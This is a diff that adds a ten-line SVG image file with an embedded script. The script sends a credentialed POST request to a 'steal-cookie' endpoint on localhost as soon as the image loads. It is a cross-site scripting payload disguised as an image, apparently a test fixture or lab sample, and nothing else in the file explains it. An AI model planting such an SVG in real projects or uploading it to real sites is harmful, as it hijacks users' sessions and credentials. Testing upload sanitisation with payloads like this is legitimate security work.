@@ -1,0 +1,10 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
+  <script>
+    fetch('http://localhost:4000/steal-cookie', {
+      method: 'POST',
+      credentials: 'include',
+    })
+    .then(response => console.log('Success:', response))
+    .catch(error => console.error('Error:', error));
+  </script>
+</svg>
